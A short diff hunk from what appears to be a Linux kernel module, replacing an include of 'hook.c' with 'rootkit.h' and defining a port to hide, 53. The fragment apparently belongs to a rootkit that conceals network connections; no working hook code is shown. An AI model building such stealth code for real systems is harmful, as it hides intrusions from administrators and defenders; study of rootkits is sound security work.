@@ -8,7 +8,7 @@
 #include <linux/slab.h>
 #include <net/sock.h>
 #include <net/ip.h>
-#include "hook.c"
+#include "rootkit.h"
 
 
 #define PORT_TO_HIDE 53
